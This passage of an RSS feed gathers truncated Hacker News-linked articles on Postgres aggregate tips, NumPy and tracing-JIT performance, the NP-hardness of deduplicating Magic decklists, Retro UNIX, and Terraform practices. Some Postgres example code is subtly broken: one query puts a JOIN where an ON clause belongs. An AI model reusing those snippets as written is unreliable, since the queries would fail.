<span>-- returns false if lock is being held by another client</span>
<span>-- otherwise acquires the lock then returns true</span></code></pre></figure>

<h3 id="aggregate-into-arrays-json-arrays-or-strings">Aggregate Into Arrays, JSON Arrays or Strings</h3>

<p>Postgres provides aggregate functions that concatenate values in a <em>GROUP</em> to
yield arrays, JSON arrays or strings:</p>

<figure><pre><code data-lang="sql"><span>-- get names of each guild, with an array of ids of players that</span>
<span>-- belong to that guild</span>
  <span>SELECT</span> <span>guilds</span><span>.</span><span>name</span> <span>AS</span> <span>guild_name</span><span>,</span> <span>array_agg</span><span>(</span><span>players</span><span>.</span><span>id</span><span>)</span> <span>AS</span> <span>players</span>
    <span>FROM</span> <span>guilds</span>
    <span>JOIN</span> <span>players</span> <span>ON</span> <span>players</span><span>.</span><span>guild_id</span> <span>=</span> <span>guilds</span><span>.</span><span>id</span>
<span>GROUP</span> <span>BY</span> <span>guilds</span><span>.</span><span>id</span><span>;</span>

<span>-- same but the player list is a CSV string</span>
  <span>SELECT</span> <span>guilds</span><span>.</span><span>name</span><span>,</span> <span>string_agg</span><span>(</span><span>players</span><span>.</span><span>id</span><span>,</span> <span>','</span><span>)</span> <span>-- ...</span>
  
<span>-- same but the player list is a JSONB array</span>
  <span>SELECT</span> <span>guilds</span><span>.</span><span>name</span><span>,</span> <span>jsonb_agg</span><span>(</span><span>players</span><span>.</span><span>id</span><span>)</span> <span>-- ...</span>
  
<span>-- same but returns a nice JSONB object like so:</span>
<span>-- { guild1: [ playerid1, playerid2, .. ], .. }</span>
<span>SELECT</span> <span>jsonb_object_agg</span><span>(</span><span>guild_name</span><span>,</span> <span>players</span><span>)</span> <span>FROM</span> <span>(</span>
  <span>SELECT</span> <span>guilds</span><span>.</span><span>name</span> <span>AS</span> <span>guild_name</span><span>,</span> <span>array_agg</span><span>(</span><span>players</span><span>.</span><span>id</span><span>)</span> <span>AS</span> <span>players</span>
    <span>FROM</span> <span>guilds</span>
    <span>JOIN</span> <span>players</span> <span>ON</span> <span>players</span><span>.</span><span>guild_id</span> <span>=</span> <span>guilds</span><span>.</span><span>id</span>
<span>GROUP</span> <span>BY</span> <span>guilds</span><span>.</span><span>id</span>
<span>)</span> <span>AS</span> <span>q</span><span>;</span></code></pre></figure>

<h3 id="aggregates-with-order">Aggregates With Order</h3>

<p>While we’re on the topic, here’s how to set the order of values that are passed
to the aggregate function, <em>within each group</em>:</p>

<figure><pre><code data-lang="sql"><span>-- each state with a list of counties sorted alphabetically</span>
  <span>SELECT</span> <span>states</span><span>.</span><span>name</span><span>,</span> <span>string_agg</span><span>(</span><span>counties</span><span>.</span><span>name</span><span>,</span> <span>','</span> <span>ORDER</span> <span>BY</span> <span>counties</span><span>.</span><span>name</span><span>)</span>
    <span>FROM</span> <span>states</span> <span>JOIN</span> <span>counties</span>
    <span>JOIN</span> <span>states</span><span>.</span><span>name</span> <span>=</span> <span>counties</span><span>.</span><span>state_name</span>
<span>GROUP</span> <span>BY</span> <span>states</span><span>.</span><span>name</span><span>;</span></code></pre></figure>

<p>Yes, there is a trailing ORDER BY clause inside the function call paranthesis.
Yes, the syntax is weird.</p>

<h3 id="array-and-unnest">Array and Unnest</h3>

<p>Use the ARRAY constructor to convert a set of rows, each with one column, into
an array.  The database driver (like JDBC) should be able to map Postgres arrays
into native arrays and might be easier to work with.</p>

<figure><pre><code data-lang="sql"><span>-- convert rows (with 1 column each) into a 1-dimensional array</span>
<span>SELECT</span> <span>ARRAY</span><span>(</span><span>SELECT</span> <span>id</span> <span>FROM</span> <span>players</span> <span>WHERE</span> <span>lifetime_spen…</span></code></pre></figure></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://pgdash.io/blog/postgres-tips-and-tricks.html?hh">http://pgdash.io/blog/postgres-tips-and-tricks.html?hh</a></em></p>]]>
            </description>
            <link>http://pgdash.io/blog/postgres-tips-and-tricks.html?hh</link>
            <guid isPermaLink="false">hacker-news-small-sites-24504948</guid>
            <pubDate>Thu, 17 Sep 2020 14:21:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data-Oriented Programming in Python]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 30 (<a href="https://news.ycombinator.com/item?id=24504947">thread link</a>) | @jbredeche
<br/>
September 17, 2020 | https://www.moderndescartes.com/essays/data_oriented_python/ | <a href="https://web.archive.org/web/*/https://www.moderndescartes.com/essays/data_oriented_python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
	

<p> Originally posted 2020-09-13</p>
<p> Tagged: <a href="https://www.moderndescartes.com/essays/tags/optimization">optimization</a>, <a href="https://www.moderndescartes.com/essays/tags/computer_science">computer_science</a>, <a href="https://www.moderndescartes.com/essays/tags/python">python</a></p>
<p> <em>Obligatory disclaimer: all opinions are mine and not of my employer </em></p>
<hr>

<p>Many users of Python deprioritize performance in favor of soft benefits like ergonomics, business value, and simplicity. Users who prioritize performance typically end up on faster compiled languages like C++ or Java.</p>
<p>One group of users is left behind, though. The scientific computing community has lots of raw data they need to process, and would very much like performance. Yet, they struggle to move away from Python, because of network effects, and because Python’s beginner-friendliness is appealing to scientists for whom programming is not a first language. So, how can Python users achieve some fraction of the performance that their C++ and Java friends enjoy?</p>
<p>In practice, scientific computing users rely on the NumPy family of libraries e.g.&nbsp;NumPy, SciPy, TensorFlow, PyTorch, CuPy, JAX, etc.. The sheer proliferation of these libraries suggests that the NumPy model is getting something right. In this essay, I’ll talk about what makes NumPy so effective, and where the next generation of Python numerical computing libraries (e.g.&nbsp;TensorFlow, PyTorch, JAX) seems to be headed.</p>
<h2 id="data-good-pointers-bad">Data good, pointers bad</h2>
<p>A pesky fact of computing is that computers can compute far faster than we can deliver data to compute on. In particular, data transfer <em>latency</em> is the Achille’s heel of data devices (both RAM and storage). Manufacturers disguise this weakness by emphasizing improvements in data transfer <em>throughput</em>, but latency continues to stagnate. Ultimately, this means that any chained data access patterns, where one data retrieval must be completed before the next may proceed, are the worst case for computers.</p>
<p>These worst-case chained data access patterns are unfortunately quite common – so common that they have a name you may be familiar with: a pointer.</p>
<p>Pointers have always been slow. In the ’80s and ’90s, our hard drives were essentially optimized record players, with a read head riding on top of a spinning platter. These hard drives had physical limitations: The disk could only spin so fast without shattering, and the read head was also mechanical, limiting its movement speed. Disk seeks were slow, and the programs that were most severely affected were databases. Some ways that databases dealt with these physical limitations are:</p>
<ul>
<li>Instead of using binary trees (requiring <span>\(\log_2 N\)</span> disk seeks), B-trees with a much higher branching factor <span>\(k\)</span> were used, only requiring <span>\(\log_k N\)</span> disk seeks.</li>
<li>Indices were used to query data without having to read the full contents of each row.</li>
<li>Vertically-oriented databases optimized for read-heavy workloads (e.g.&nbsp;summary statistics over one field, across entire datasets), by reorganizing from <a href="https://en.wikipedia.org/wiki/AoS_and_SoA">arrays of structs to structs of arrays</a>. This maximized effective disk throughput, since no extraneous data was loaded.</li>
</ul>
<p>Today, compute speed is roughly <span>\(10^5 - 10^6\)</span> times faster than in 1990. Today, RAM is roughly <span>\(10^5\)</span> times faster than HDDs from 1990. I was amused and unsurprised to find that Raymond Hettinger’s <a href="https://www.youtube.com/watch?v=npw4s1QTmPg">excellent talk on the evolution of Python’s in-memory <code>dict</code> implementation</a> plays out like a brief history of early database design. Time, rather than healing things, has only worsened the compute-memory imbalance.</p>
<h2 id="numpys-optimizations">NumPy’s optimizations</h2>
<h3 id="boxing-costs">Boxing costs</h3>
<p>In many higher-level languages, raw data comes in boxes containing metadata and a pointer to the actual data. In Python, the PyObject box holds reference counts, so that the garbage collector can operate generically on all Python entities.</p>
<p>Boxing creates two sources of inefficiency:</p>
<ul>
<li>The metadata bloats the data, reducing the data density of our expensive memory.</li>
<li>The pointer indirection creates another round trip of memory retrieval latency.</li>
</ul>
<p>A NumPy array can hold many raw data within a single PyObject box, <em>provided that all of those data are of the same type</em> (int32, float32, etc.). By doing this, NumPy amortizes the cost of boxing over multiple data.</p>
<p>In <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">my previous investigations into Monte Carlo tree search</a>, a naive UCT implementation performed poorly because it instantiated millions of UCTNode objects whose sole purpose was to hold a handful of float32 values. In the optimized UCT implementation, these nodes were replaced with NumPy arrays, reducing memory usage by a factor of 30.</p>
<h3 id="attribute-lookup-function-dispatch-costs">Attribute lookup / function dispatch costs</h3>
<p>Python’s language design forces an unusually large amount of pointer chasing. I mentioned boxing as one layer of pointer indirection, but really it’s just the tip of the iceberg.</p>
<p>Python has no problem handling the following code, even though each of these multiplications invokes a completely different implementation.</p>
<pre><code>&gt;&gt;&gt; mixed_list = [1, 1.0, 'foo', ('bar',)]
&gt;&gt;&gt; for obj in mixed_list:
...     print(obj * 2)

2
2.0
'foofoo'
('bar', 'bar')</code></pre>
<p>Python accomplishes this with a minimum of two layers of pointer indirection:</p>
<ol type="1">
<li>Look up the type of the object.</li>
<li>Look up and execute the <code>__mul__</code> function from that type’s operation registry.</li>
</ol>
<p>Additional layers of pointer indirection may be required if the <code>__mul__</code> method is defined on a superclass: the chain of superclasses must be traversed, one pointer at a time, until an implementation is found.</p>
<p>Attribute lookup is similarly fraught; <code>@property</code>, <code>__getattr__</code>, and <code>__getattribute__</code> provide users with flexibility that incurs pointer chasing overhead with something as simple as executing <code>a.b</code>. Access patterns like <code>a.b.c.d</code> create exactly the chained data access patterns that are a worst-case for data retrieval latency.</p>
<p>To top it all off, merely <em>resolving</em> the object is expensive: there’s a stack of lexical scopes (local, nonlocal, then global) that are checked in order to find the variable name. Each check requires a dictionary lookup, another source of pointer indirection.</p>
<p>As the saying goes: “We can solve any problem by introducing an extra level of indirection… except for the problem of too many levels of indirection”. The NumPy family of libraries deals with this indirection, not by removing it, but again by sharing its cost over multiple data.</p>
<pre><code>&gt;&gt;&gt; homogenous_array = np.arange(5, dtype=np.float32)
&gt;&gt;&gt; multiply_by_two = homogenous_array * 2
&gt;&gt;&gt; print(multiply_by_two)
array([ 0.,  2.,  4.,  6.,  8.], dtype=float32)</code></pre>
<p>Sharing a single box for multiple data allows NumPy to retain the expressiveness of Python while minimizing the cost of the dynamism. As before, this works because of the additional constraint that all data in a NumPy array must have identical type.</p>
<h2 id="the-frontier-jit">The Frontier: JIT</h2>
<p>So far, we’ve seen that NumPy doesn’t solve any of Python’s fundamental problems when it comes to pointer overhead. Instead, it merely puts a bandaid on the problem by sharing those costs across multiple data. It’s a pretty successful strategy – in my hands (<a href="https://www.moderndescartes.com/essays/vectorized_pagerank">1</a>, <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">2</a>), I find that NumPy can typically achieve 30-60x speedups over pure Python solutions to dense numerical code. However, given that C code typically achieves <a href="https://www.moderndescartes.com/essays/data_oriented_python/(https://benchmarksgame-team.pages.debian.net/benchmarksgame/fastest/python3-gcc.html)">100-200x performance</a> over pure Python on dense numerical code (common in scientific computing), it would be nice if we could further reduce the Python overhead.</p>
<p>Tracing <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">JITs</a> promise to do exactly this. Roughly, the strategy is to trace the execution of the code and record the pointer chasing outcomes. Then, when you call the same code snippet, reuse the recorded outcomes! NumPy amortizes Python overhead over multiple data, and JIT amortizes Python overhead over multiple function calls.</p>
<p>(I should note that I’m most familiar with the tracing JITs used by TensorFlow and JAX. <a href="https://doc.pypy.org/en/latest/">PyPy</a> and <a href="https://numba.pydata.org/">Numba</a> are two alternate JIT implementations that have a longer history, but I don’t know enough about them to treat them fairly, so my apologies to readers.)</p>
<p>Tracing unlocks many wins typically reserved for compiled languages. For example, once you have the entire trace in one place, operations can be fused together (e.g., to make use of the <a href="https://en.wikipedia.org/wiki/FMA_instruction_set">fused multiply-add instructions</a> common to most modern computers), memory layouts can be optimized, and so on. TensorFlow’s <a href="https://www.tensorflow.org/guide/graph_optimization">Grappler</a> is one such implementation of this idea. Traces can also be <a href="https://en.wikipedia.org/wiki/Backpropagation">walked backwards</a> to automatically compute derivatives. Traces can be compiled for different hardware configurations, so that the same Python code executes on CPU, GPU, and TPU. JAX can <a href="https://jax.readthedocs.io/en/latest/notebooks/quickstart.html#Auto-vectorization-with-vmap">autovectorize traces</a>, adding a batch dimension to all operations. Finally, a trace can be exported in a language-agnostic manner, allowing a program defined in Python to be executed in <a href="https://www.tensorflow.org/js">Javascript</a>, <a href="https://www.tensorflow.org/tfx/guide/serving">C++</a>, or more.</p>
<p>Unsurprisingly, there’s a catch to all this. NumPy can amortize Python overhead over multiple data, but only if that data is the same type. JIT can amortize Python overhead over multiple function calls, but only if the function calls would have resulted in the same pointer chasing outcomes. Retracing the function to verify this would defeat the purpose of JIT, so instead, TensorFlow/JAX JIT uses array shape and dtype to guess at whether a trace is reusable. This heuristic is necessarily conservative, rules out otherwise legal programs, often requires unnecessarily specific shape information, and doesn’t make any guarantees against mischievous tinkering. Furthermore, data-dependent tracing is a known issue (<a href="https://pytorch.org/docs/stable/generated/torch.jit.trace.html">1</a>, <a href="https://jax.readthedocs.io/en/latest/notebooks/Common_Gotchas_in_JAX.html#python-control-flow-+-JIT">2</a>). I worked on <a href="https://blog.tensorflow.org/2018/07/autograph-converts-python-into-tensorflow-graphs.html">AutoGraph</a>, a tool to address data-dependent tracing. Still, the engineering benefits of a shared tracing infrastructure are too good to pass up. I expect to see JIT-based systems flourish in the future and iron out their user experience.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The NumPy API’s specifically addresses Python’s performance problems for the kinds of programs that scientific computing users want to write. It encourages users to write code in ways that minimize pointer overhead. Coincidentally, this way of writing code is a fruitful abstraction for tracing JITs targeting vastly parallel computing architectures like GPU and TPU. (Some people argue that <a href="https://dl.acm.org/citation.cfm?id=3321441">machine learning is stuck in a rut</a> due to this NumPy monoculture.) In any case, tracing JITs built on top of …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moderndescartes.com/essays/data_oriented_python/">https://www.moderndescartes.com/essays/data_oriented_python/</a></em></p>]]>
            </description>
            <link>https://www.moderndescartes.com/essays/data_oriented_python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24504947</guid>
            <pubDate>Thu, 17 Sep 2020 14:21:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deduplicating Decklists]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24504939">thread link</a>) | @umanwizard
<br/>
September 17, 2020 | http://justinjaffray.com/deduplicating-decklists/ | <a href="https://web.archive.org/web/*/http://justinjaffray.com/deduplicating-decklists/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

<p><small>17 Sep 2020</small></p><p>This is not going to be my normal kind of post, it’s not very focused, and
going to be a bit rambley, as I talk about a problem I thought about one day.</p>
<p>Magic: The Gathering is a card game where players construct decks, typically of
60 cards plus a 15 card sideboard, for 75 cards total.</p>
<p>Periodically, the company that makes the game,
Wizards of the Coast (WotC) publishes a
list of decks that did well recently.
Just recently they
<a href="https://magic.gg/news/esports-update-grand-finals-formats-decklist-hub-and-more">announced</a> that they were going to start doing this for their most recent digital offering of the game.
Stay with me! This isn’t a post about card games.
This list, however, is doctored: they want the data shown to be broad and not repetitive, so they perform some amount of deduplication on the data.
This means that if two “similar” decks do well, only one will be shown in the dump.
The linked article outlines what is meant by “similar:”</p>
<blockquote>
<p>We will be publishing lists from Standard Ranked, Traditional Standard Ranked, Historic Ranked, and Traditional Historic Ranked play queues. Like we do for Magic Online Leagues, we will be posting an example list for each category of deck that share a minimum number of cards: at least 55 of 75 cards (across main deck and sideboard) shared in Traditional (best of three games, or Bo3) or at least 45 of 60 main deck cards shared in best of one (Bo1). All lists published will have won at least six consecutive matches.</p>
</blockquote>
<p>This seemed to me like an interesting problem!
Given a raw set of decks that did well, how could we produce such a
deduplicated set of decks?</p>
<p>At a high level, we might envision the set of decks as a bunch of points in some
space, where points are closer together if the decks are more “similar” (for some
meaning of “similar” we haven’t made precise yet).</p>
<p><img src="http://justinjaffray.com/images/decks1.png">
</p>
<p>With a solution being a set of decks which “cover” the set of all other decks
(for some meaning of “cover” we haven’t made precise yet).</p>
<p><img src="http://justinjaffray.com/images/decks2.png">
</p>
<p>To be slightly more precise, given a set \(D\) of “decks,” we want to find a
minimal set \(D^\prime \subseteq D\) such that every \(d \in D\) is
“sufficiently close” to some \(d^\prime \in D^\prime\).</p>
<p>Let’s define what we mean by “deck” and “sufficiently close.” We can represent
decks as maps from the set of cards \(C\) to some integer \(n \in \mathbb N\)
denoting how many copies of a given card are in the deck.
We might also think of this as an \(\mathbb N\) vector indexed by \(C\), which can be denoted \(\mathbb N ^ C\).
That’s all to say, you should think of one of these decks as just a sequence of numbers denoting how many of a given card were included,
where each index corresponds to a particular card:
\[
\langle
\ldots, 4 \ldots, 2, \ldots, 1, \ldots, 4, \ldots
\rangle
\]
The sequence is finite, since there’s a finite number of Magic cards (about twenty thousand).</p>
<p>For “closeness” of two decks, per the statement above from WotC we are interested in the <em>total number of different cards between them</em>.
That is, the distance between two decks \(a\) and \(b\) is the sum
of the absolute difference of the quantity of each card:
\[
|a - b| = \sum_{c \in C} \left| a_c - b_c \right|.
\]
This way of measuring distance is pretty natural, and satisfies some
nice properties:</p>
<ol>
<li>\(|a - b| = 0\) if and only if \(a = b\),</li>
<li>\(|a - b| = |b - a|\) (symmetry), and</li>
<li>\(|a - c| \le |a - b| + |b - c|\) (triangle inequality).</li>
</ol>
<p>A notion of distance that satisfies properties 1, 2, and 3 happens to be called a <em>metric</em>,
and a set combined with a metric on that set is called a <em>metric space</em>.
This particular metric we’ve stumbled on is actually well known, and is called
the \(\ell_1\)-norm.</p>
<p>We’ll be a little abstract here, but when you hear “metric” you should just
think “way of thinking about distance.”
If you look at the three properties, they’re all pretty natural things you’d want from a measure of “distance:”</p>
<ol>
<li>says the only thing “zero distant” from a thing is the thing itself,</li>
<li>says that \(a\) is exactly as far from \(b\) as \(b\) is from \(a\), and</li>
<li>says two things can’t be further away than the sum of their distances to a third thing.</li>
</ol>
<p>There are lots of metrics people use for various things.
Another one is the \(\ell_2\)-norm, which you might also know as Euclidean distance:
if you have two points in Euclidean space and draw a straight line between
them, their \(\ell_2\)-distance is the length of that line.
In two-dimensional space,
\[
|a - b| = \sqrt{(a_x - b_x)^2 + (a_y - b_y)^2}
\]
Which is just the Pythagorean theorem.
For our problem we’re concerned with the \(\ell_1\)-distance, as described above.</p>
<p>Why bother introducting this abstraction?
Well, mostly I just thought it was kind of neat, but
I think making this kind of hop upwards the abstraction hierarchy can be useful to understand problems sometimes,
because it lets us make concrete the link between our actual problem, \(\ell_1\)-distance of 20,000-dimensional \(\mathbb N\)-points, weird, scary, hard to visualize, to
a problem which is easier to conceptualize: \(\ell_2\)-distance of two-dimensional points.</p>
<p><img src="http://justinjaffray.com/images/decks2.png">
</p>
<p>Seen this way, this kind of picture isn’t just a helpful mental model,
but it actually has a real, quantifiable link to the original problem we were trying to solve.</p>
<p>When thinking about this problem, it’s not completely accurate, but it’s not
too bad to just imagine the \(\ell_2\) picture above.</p>
<p>Remember that the thing we’re primarily interested in is going to be
all the points “sufficiently close” to a given point,
where “sufficiently close” means “has distance less than some \(r\).”
It turns out this thing has a name, the <em>(closed) ball of radius \(r\) centered at \(p\)</em> is
the set of points \(x\) satisfying \(|x - p| \le r\).
A “ball” is basically what you expect in most contexts, in 2D space, under the \(\ell_2\)-norm (our diagram above)
a ball is a (filled in) circle.
In 3D it’s a sphere.
In “deck-space,” it’s the set of decks you can make from \(p\) by adding and removing at most \(r\) cards.</p>
<p>This lets us rephrase our problem a bit more generally.
Given a metric space \(M\), a finite set of points \(P \subseteq M\), and a radius \(r\),
we want to find a set \(P^\prime \subseteq P\) such that every \(p \in P\)
is within some ball of radius \(r\) centered at some \(p^\prime \in P^\prime\).</p>
<p>So, can we solve <em>this</em> problem, in a <em>general</em> metric space, efficiently?
It turns out we actually can’t!
Why did I bother going down this road of generalization if it was going to lead to a dead-end?
Well, it’s the road I took when thinking about this problem and it’s my blog,
and also it’s actually easy to show that the problem at this level of generality is NP-hard.
As a reminder, to show this is NP-hard for metric spaces in general, we must:</p>
<ol>
<li>Fix some metric space, and</li>
<li>show that computing the size of the cover is NP-hard by showing that an
efficient solution to <em>that</em> would allow us to solve some other NP-hard
problem.</li>
</ol>
<p>Consider a graph \(G\):</p>
<p><img src="http://justinjaffray.com/images/petersen.png">
</p>
<p>The <em>dominating set problem</em> is this:
given a graph \(G = (V, E)\), find a set \(V^\prime\) of vertices such that every \(v \in V\) is adjacent to some
\(v^\prime \in V^\prime\).
That is, we want to choose some set of vertices that “cover” all other vertices: every other vertex is adjacent to one we chose.
Finding a minimum dominating set is a well known NP-complete problem,
and already smells similar to our problem!</p>
<p>If we define a binary function on the vertices of \(G\):
\[
d(a, b) = \text{the length of the shortest path between $a$ and $b$},
\]
it turns out \(d\) is a metric (check this yourself, it’s easy)!</p>
<p>If we take this metric and set \(r\) to 1, we’ve exactly recreated the
dominating set problem, which, being NP-complete, means our problem
in a general metric space is also NP-complete.
While this doesn’t mean that our original problem about Magic decks is
NP-complete (though it’s evidence that suggests this might be the case),
it does mean that any algorithm that <em>only</em> uses the properties of a metric space
probably doesn’t have an efficient solution.</p>
<p>When asked about this, my friend <a href="https://www.its.caltech.edu/~fshinko/">Forte</a>
found a nice reduction from 3SAT to the deck problem if \(r\) is at least four.
The gist of it is this:</p>
<ul>
<li>Given an instance of 3SAT with \(n\) variables \(\{v_1, \ldots, v_n\}\), let your set of “cards” be
\(\{x_1, \ldots, x_n\} \cup \{y_1, \ldots, y_n\}\).</li>
<li>For each clause \(a \vee b \vee c\), take the vector that is 1 at \(x_i\) for the variable for \(a\) if \(a\) is not negated, and -1 if it is, and the same for \(b\) and \(c\).</li>
<li>For each variable \(v_i\), add three vectors that are all 2 at \(y_i\), and -1, 0, and 1 at \(x_i\), respectively (the choice of the one at 1 or -1 will correspond to whether we take that variable to be true or not, and the 0 one is there to ensure you need to take at least one of them).</li>
<li>This set of decks has a cover of size \(n\) (for radius 4) if and only if the 3SAT instance was satisfiable (the numbers can be tweaked to support radii larger than 4).</li>
</ul>
<p>If \(r\) is one then there actually <em>is</em> an efficient solution,
because in this case the adjacency graph is bipartite, and a dominating set of a
bipartite graph can be found in polynomial time.
I don’t know if there’s an efficient solution when \(r\) is two or three.</p>
<p>Ok, well, we are probably not going to find an efficient solution then, how about an
inefficient solution?
Wizard of the Coast must have <em>some</em> way of doing that, since they regularly
publish such deduplicated decklists.
The likely answer, I’d guess, is that they don’t fret about finding the minimum cover,
and just do something like “output uncovered decks until none remain.”
Or possibly there are just few enough decklists that they have an excel spreadsheet
or something that makes sure their stated invariants are upheld. Unsure!
If you work at WotC and somehow came across this post I’d be curious to learn the real answer.</p>
<p>I can’t say how they actually do it, but there are plenty of heuristic methods
for solving this kind of thing that they might employ if you’re actually
interested in finding a good solution.</p>
<p>Techniques like
<a href="http://justinjaffray.com/branch-and-bound/">Branch and Bound</a> or simulated</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://justinjaffray.com/deduplicating-decklists/">http://justinjaffray.com/deduplicating-decklists/</a></em></p>]]>
            </description>
            <link>http://justinjaffray.com/deduplicating-decklists/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24504939</guid>
            <pubDate>Thu, 17 Sep 2020 14:20:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Retro Unix Operating System]]>
            </title>
            <description>
<![CDATA[
Score 79 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24504891">thread link</a>) | @elvis70
<br/>
September 17, 2020 | https://www.singlix.com/runix | <a href="https://web.archive.org/web/*/https://www.singlix.com/runix">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="390">

            
<p>
<span lang="en-us"><span face="Arial" color="#003366" size="2">
Retro UNIX 8086 v1 operating system has been developed by Erdogan Tan as a 
special purposed derivation of original UNIX v1 (by Ken Thompson, 1970-1972).</span></span></p>

<p>
<span face="Arial" color="#003366" size="2"><span lang="en-us">Source code has 
been ported from PDP-11 Unix assembler syntax to Microsoft Macro Assembler 
(INTEL x86 real mode) syntax and original unix source code has been modified for 
IBM PC/AT compatibility with standard ROM BIOS functions, without 
dropping/removing original UNIX v1 multitasking (time-sharing) features.</span></span></p>

<p><span lang="en-us">
<span face="Arial" size="2" color="#003366">Retro UNIX 386 v1 is 32 bit (80386 
protected mode) version of Retro UNIX 8086 v1. Retro UNIX 386 v1 operating 
system kernel and binaries have been written in assembly language syntax of 
Netwide Assembler (NASM). </span>
</span></p>

<p>
<span face="Arial" color="#003366" size="2"><span lang="en-us">Retro UNIX is a 
predecessor to SINGLIX operating system project.<br>
&nbsp;</span></span></p>
            </div></div>]]>
            </description>
            <link>https://www.singlix.com/runix</link>
            <guid isPermaLink="false">hacker-news-small-sites-24504891</guid>
            <pubDate>Thu, 17 Sep 2020 14:16:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3 Terraform tips that will save you from terrible mistakes]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24504373">thread link</a>) | @ish-xyz
<br/>
September 17, 2020 | https://ish-ar.io/terraform_blog_series_3_tips/ | <a href="https://web.archive.org/web/*/https://ish-ar.io/terraform_blog_series_3_tips/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>
      <a href="https://ish-ar.io/static/824daa81507552818ac52c9002670de9/782f4/terraform-icon.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="terraform-icon" title="terraform-icon" src="https://ish-ar.io/static/824daa81507552818ac52c9002670de9/782f4/terraform-icon.png" srcset="https://ish-ar.io/static/824daa81507552818ac52c9002670de9/cf440/terraform-icon.png 148w,
https://ish-ar.io/static/824daa81507552818ac52c9002670de9/d2d38/terraform-icon.png 295w,
https://ish-ar.io/static/824daa81507552818ac52c9002670de9/782f4/terraform-icon.png 480w" sizes="(max-width: 480px) 100vw, 480px">
  </a>
    </span></p>
<h2>1. A big single state file is not going to help you.</h2>
<p>When a new user starts with Terraform, it could seem easier to manage all the infrastructure code under one big repository and one big state file (To who doesn’t know what a state file is, check out this page -&gt; <a href="https://www.terraform.io/docs/state/index.html">https://www.terraform.io/docs/state/index.html</a>)</p>
<p>However, this design will soon show its downsides and limits.</p>
<p><strong>Why is a mono state file, not a good idea in terms of performance?</strong></p>
<p>One of the reason is that during the ‘terraform plan’ command there’s an action called “refresh”. This step means that Terraform is about to “reconcile the state Terraform knows about (via its state file) with the real-world infrastructure.”<br>
If there’s a big state file with the whole infrastructure mapped and a person wants to change just a single GKE cluster, remove a single EC2 instance or create a new bucket.<br>
Guess what? <strong>It will require the refresh on the whole infrastructure</strong> (and trust me, it will take a while!)</p>
<p><strong>But what about the infrastructure reliability?</strong></p>
<p>What happens if accidentally someone runs ‘terraform destroy’ against that mono state file?<br>
Yes. It’s all gone. You would have to recreate the infrastructure.</p>
<p>What happens if someone uses a new terraform version? (e.g.: from terraform 0.11 to terraform 0.12)<br>
Everyone would have to upgrade the CLI version, and if you’re unlucky, you might also need to update the actual terraform code.<br>
There are other reasons, but I’m sure I’ve made this point clear enough: don’t use a single state file! -.-’</p>
<h2>2. Monorepo is evil.</h2>
<p>Someone  might say: let’s put all together, modules, code, everything in a single repository but in different directories with different state files: brilliant -.-’</p>
<p>Trust me when I say that I’ve seen the worst things with Terraform: repositories with symlinks to share/copy variables in different directories, I’ve seen gigantic mono repositories, terraform files generated from bash scripts and an SQL database, trust me it’s not fancy out there.</p>
<p>Why is a huge repository NOT a good idea in terms of code reliability?<br>
Plain and simple: it doesn’t scale.<br>
Now imagine you’re a small team of 5 engineers, pushing all the infrastructure code together might seem a good idea.<br>
You all have permission to create/remove/edit the terraform code, and this way, you would not have to deal with multiple pipelines, etc.</p>
<p>However after a year, your small team of 5 becomes 100. Other engineers now want to use Terraform to manage their infrastructures (network engineers, DBAs, Data Engineers, Data Scientists, etc.).</p>
<p>It will become tricky (not impossible) to manage permissions, coordinate terraform changes, and create a whole pipeline/automation that can satisfy everyone’s need.</p>
<p>And what if you have used modules inside that single repository?<br>
How are you going to manage modules versions?<br>
A poor repositories structure design generates all these obstacles.</p>
<p>What if you are already there?<br>
My piece of advice is start by moving modules to different repositories.<br>
You can also start to automate testing and tagging on modules.<br></p>
<p>After this first step is done, split your infrastructure into layers, and start to divide the layers inside different repositories managed by the owners of that layer of infrastructure.<br>
It will be painful!<br>
Remember, no pain, no gain!</p>
<h2>3. Don’t run Terraform manually: use pipelines.</h2>
<p>Here too, I’ve seen the worst things. I’ve once worked for a company that used to have a Slack channel where they “locked” Terraform by basically sending messages like “I’m using Terraform” or “terraform locked”: I mean… seriously? “Terraform locked”?  -.-’</p>
<p>Having the right orchestration and automation will help your team to don’t override each other changes.<br>
If you plan to work with pipelines, my advice is to have <em>no</em> concurrent builds and run the automation on tiny parts of the infrastructures.<br>
By doing this, there won’t be long pipelines but quick flows with an effective feedback cycle.</p>
<p><em>Always tag your infrastructure code</em>, and treat it as a real software/application.</p>
<p><em>Run tests.</em> Testing Terraform code might look complicated but there some useful tools out there such as “terratest”.<br>
If you’re comfortable with Go, you can follow Hashicorp’s tutorials about unit testing with Terraform.</p>
<p><em>You should have a tool to handle the CI and another to run the deploy.</em><br>
In my opinion, the desired situation is that the CI tool would push an artifact with the tested Terraform code in it, and the deploy would pick the artifact and deploy it.</p>
<h2>Conclusion</h2>
<p>The perfect way to run Terraform doesn’t exist.<br>
In most cases, it depends on the use case, BUT there are some errors that I’d define common mistakes that everyone should avoid.<br>
Remember: well begun is half done :)</p></div></div>]]>
            </description>
